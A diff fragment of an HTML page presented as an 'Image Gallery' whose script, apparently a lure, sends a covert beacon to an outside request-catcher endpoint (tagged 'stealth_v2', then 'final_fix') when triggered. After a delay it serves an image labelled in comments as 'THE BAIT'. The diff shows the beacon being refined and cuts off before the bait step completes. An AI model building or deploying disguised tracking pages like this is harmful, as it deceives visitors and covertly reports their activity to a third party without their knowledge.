@@ -4,12 +4,12 @@
     <title>Image Gallery</title>
     <script>
         function triggerAlpha() {
-            // REPLACE THIS URL WITH YOUR NEW ONE
+            // VERIFIED ENDPOINT
             const alpha = "https://bluekama-ops.free.beeceptor.com/hit";
             const omega = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // 1. DATA PING
-            navigator.sendBeacon(alpha + "?ref=stealth_v2&ts=" + Date.now());
+            // 1. DATA PING (No delay)
+            navigator.sendBeacon(alpha + "?ref=final_fix&ts=" + Date.now());
 
             // 2. THE BAIT (1 second delay)
             setTimeout(function() {
